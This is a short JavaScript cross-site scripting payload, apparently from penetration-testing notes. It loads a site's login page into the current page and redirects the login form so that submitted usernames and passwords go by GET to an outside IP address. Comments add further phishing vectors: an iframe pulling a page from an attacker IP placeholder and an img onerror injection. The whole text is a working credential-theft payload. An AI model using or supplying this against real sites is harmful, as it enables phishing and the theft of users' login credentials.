fetch("login").then(res => res.text().then(data => {
        document.getElementsByTagName("html")[0].innerHTML = data
        document.getElementsByTagName("form")[0].action = "http://192.168.45.206" 
        document.getElementsByTagName("form")[0].method = "get"
}))



//iframes are also good for phishing:
//<iframe src=//<IP>/p.html>

//img tags:
//<img src=x onerror="document.write('<HTML>')">
